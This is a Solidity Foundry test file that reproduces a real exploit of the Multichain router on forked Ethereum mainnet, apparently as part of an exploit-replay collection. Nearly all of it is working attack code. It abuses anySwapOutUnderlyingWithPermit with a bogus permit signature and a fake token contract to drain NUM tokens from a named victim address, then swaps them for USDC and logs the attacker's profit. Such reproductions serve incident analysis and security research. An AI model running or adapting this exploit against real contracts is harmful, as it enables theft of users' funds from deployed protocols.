// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1595346020237352960
// @TX
// https://etherscan.io/tx/0x8a8145ab28b5d2a2e61d74c02c12350731f479b3175893de2014124f998bff32

interface MultichainRouter {
    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint256 toChainID
    ) external;
}

contract ContractTest is Test {
    IERC20 NUM = IERC20(0x3496B523e5C00a4b4150D6721320CdDb234c3079);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    MultichainRouter multichainRouter = MultichainRouter(0x765277EebeCA2e31912C9946eAe1021199B39C61);
    Uni_Router_V3 Router = Uni_Router_V3(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
    address victimAddress = 0x78AC2624a2Cd193E8dEfE9F39A9528e8bd4a368c;
    uint256 NUMBalance;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_029_969);
    }

    function testExploit() external {
        NUMBalance = NUM.balanceOf(victimAddress);
        uint8 v = 0;
        bytes32 r = 0x3078000000000000000000000000000000000000000000000000000000000000;
        bytes32 s = 0x3078000000000000000000000000000000000000000000000000000000000000;
        multichainRouter.anySwapOutUnderlyingWithPermit(
            victimAddress, address(this), address(this), NUMBalance, block.timestamp + 60, v, r, s, 12
        );
        NUM.approve(address(Router), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);
        NUM.transfer(address(Router), NUM.balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = address(NUM);
        path[1] = address(USDC);
        Router.swapExactTokensForTokens(0, 0, path, address(this));

        emit log_named_decimal_uint("[End] Attacker USDC balance after exploit", USDC.balanceOf(address(this)), 6);
    }

    function underlying() external returns (address) {
        return address(NUM);
    }

    function depositVault(uint256 amount, address to) external returns (uint256) {
        return NUMBalance;
    }

    function burn(address from, uint256 amount) external returns (bool) {
        return true;
    }
}
